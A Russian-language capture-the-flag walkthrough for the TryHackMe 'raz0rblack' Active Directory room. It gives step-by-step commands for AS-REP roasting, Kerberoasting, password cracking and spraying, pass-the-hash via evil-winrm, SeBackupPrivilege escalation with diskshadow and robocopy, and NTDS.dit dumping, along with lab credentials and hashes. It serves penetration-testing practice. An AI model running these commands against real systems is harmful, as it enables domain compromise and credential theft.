https://tryhackme.com/room/raz0rblack

Вначале обозначим ip выданной тачки в переменную для удобства у меня это так
```bash
target=10.16.165.25 - у вас другая не суть.
```
Cканим дефолтно
```bash
rustscan -a $target --ulimit 5000 -- -sV -sC -Pn -oA razorblack
```
видим шары
```bash
nmap -sV -script=nfs* $target -p 111
```

```bash
showmount -e $target

sudo mount -t nfs -o nolock,noresvport $target:/users ./creds
```
посмотрев содержимое найдем два файла, 1 флаг, второй список пользаков
открыв его будет что то вроде 
```bash
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
```
получив пользаков, пробуем составляем список как первый символ имени+фамилия
```bash
impacket-GetNPUsers raz0rblack.thm/ -usersfile userrazor.txt -dc-ip $target -request -output hashes.txt
```
нашли и сразу крякаем
```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes.txt
```
roastpotatoes    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)



Первая пара - twilliams:roastpotatoes 
пробуем пробить всех пользаков какие есть
```bash
nxc smb 10.10.215.15 -u twilliams -p roastpotatoes --rid-brute > rid_brute.txt 
```
очистим оставив только пользаков 
```bash
cat rid_brute.txt | awk {print $6} | cut -d ":" -f2
```

ничего особо не нашли, пробуем спрей c найденным паролем, вдруг у кого то такой же, видим что у одного пользака надо сменить пароль.
```bash
nxc smb -u user.txt -p 'roastpotatoes'
```
меняем пароль 
```bash
impacket-changepasswd raz0rblack.thm/sbradley:roastpotatoes@$target -newpass roastpotatoes124
```
получилась пара
sbradley:roastpotatoes124

сразу бежим чекать что в шарах
```bash
nxc smb -u 'sbradley' -p 'roastpotatoes124' --shares

smbclient//$target/trash -U 'sbradley%roastpotatoes124'
```
выкачиваваем все..  mget *
архив запоролен 
можно вскрыть john
```bash
zip2john experiment_gone_wrong.zip > zip.hash
```
затем
```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt zip.hash
```
пароль архива electromagnetismo
```bash
unzip experiment_gone_wrong.zip
```
можно сделать локальный дамп по этим файлам
```bash
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL > dump.txt
```
подготовим файлик оставив только хеши
```bash
cat dump.txt | cut -d ":" -f 4 > hashes.txt
```
для подбора хеша для пользака lvetrova 
```bash
nxc smb $target -u lvetrova -H hashes.txt
```
Для удаленного подключения будем использовать Evil-WinRM
```bash
evil-winrm -i $target -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
```
подготовим 

находим у пользака в наш флаг 
```bash
type lvetrova.xml
```
однако он зашифрован, его надо расшифровать для этого в консоле evil-winrm
```bash
$Creds = Import-Clixml -Path ".\lvetrova.xml"
$Creds.GetNetworkCredential().password
```
получаем флаг

Далее,зная имя пользователя и хеш его пароля, проведем атаку Kerberoasting, воспользуясь GetUserSPNs, запросив TGS
```bash
impacket-GetUserSPNs -dc-ip $target raz0rblack.thm/lvetrova  -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d  -outputfile kerb2.txt
```
загоняем в джона полученные данные
```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt kerb2.txt
```
получаем учетку xyan1d3:cyanide9amine5628
бежим в него
```bash
evil-winrm -i 10.10.215.15 -u xyan1d3 -p cyanide9amine5628

whoami /all
```
Видим привилегию  SeBackupPrivilege.

Для осуществления эскалации привилегий нам понадобится утилита diskshadow.exe, скрипт и две DLL: SeBackupPrivilegeUtils.dll и SeBackupPrivilegeCmdLets.dll

Также создадим (на своей машине) следующий скрипт для осуществления теневого копирования и назовем его diskshadow.txt
```bash
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
Также скачаем две DLL
```bash
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```
Теперь все загружаем в на виндовс машину в консоле evil-winrm

перейдем в С.
и создадим там временную папку mkdir tmp
перейдем туда и
```bash
upload diskshadow.txt
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll
```
пропишем 
```bash
import-module .\eBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
```
Сделав все процедуры запускаем наш скрипт через утилиту diskshadow.exe

```bash
diskshadow.exe /s C:\tmp\diskshadow.txt
```
После успешного создания теневой копии воспользуемся утилитой robocopy
```bash
robocopy /b E:\windows\ntds . ntds.dit
```
После этого копируем куст реестра SYSTEM через команду reg save и выкачиваем наши файлы
```bash
reg save HKLM\SYSTEM C:\tmp\system
```
скачаем теперь на наш комп с Эвила командой
```bash
download ntds.dit
download system
```

После скачивания файлов ntds.dit и system произведем локальный дамп секретов из этих файлов с помощью secretsdump
```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```
подключаемся как админ через evil
```bash
evil-winrm -i $target -u administrator -H 9689931bed40ca5a2ce1218210177f0c
```

читаем флаг админа type root.xml
ранее проделанный трюк не помог
бежим на cyberchef и узнаем что это hex конвертируем и получаем наш флаг


чтобы получить флаг twilliams

идем к нему и запускаем длинный exe
```bash
type .\definitely_d... допишите сами, там главное правильно название скопировать и вставить без пробелов и он выплюнет флаг.
```
секретный секрет можно получить по пути cd "C:\Program Files \Top Secret"
скачайте ее 
```bash
download top_secret.png
```
итого секретный секрет :wq - выход из вима.
